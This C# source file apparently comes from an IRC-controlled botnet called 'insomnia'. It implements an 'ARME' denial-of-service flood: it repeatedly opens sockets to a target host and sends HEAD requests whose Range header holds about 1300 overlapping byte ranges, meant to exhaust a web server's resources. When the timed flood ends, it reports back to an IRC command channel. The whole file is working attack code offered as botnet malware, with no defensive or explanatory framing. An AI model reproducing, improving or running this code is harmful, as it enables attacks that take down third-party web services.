using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;

namespace insomnia
{
    class ARME
    {
        private static string bytes = GenBytes();
        public static string host;
        public static int port;
        public static int delay;

        public static bool isEnabled = false;

        // Generate byte data sent by ARME
        private static string GenBytes()
        {
            string data = String.Empty;

            for (int i = 0; i < 1300; i++)
                data += ",5-" + i;

            return data;
        }

        public static void Begin()
        {
            int seconds = delay * 1000;
            new Thread(() => SendPayload(Functions.ipE(host, port))).Start();

            Thread.Sleep(seconds);

            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("ARME flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendPayload(IPEndPoint ip)
        {
            string request = "HEAD / HTTP/1.1\r\nHost: {0}\r\nRange:bytes=0-{1}\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
            string build_request = string.Format(request, host, bytes);
            byte[] data = Encoding.UTF8.GetBytes(build_request);

            Socket s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            // As long as flood is enabled lets send data on each socket
            while (isEnabled)
            {
                try
                {
                    s.Connect(ip.Address, port);
                    s.Send(data, data.Length, 0);
                    s.Close();
                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                }
                catch
                {
                    if (s.Connected)
                        s.Close();

                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    Thread.Sleep(2000);
                }
                Thread.Sleep(10);
            }

            // Cleanup
            if (s.Connected)
                s.Close();

            s = null;
        }
    }
}
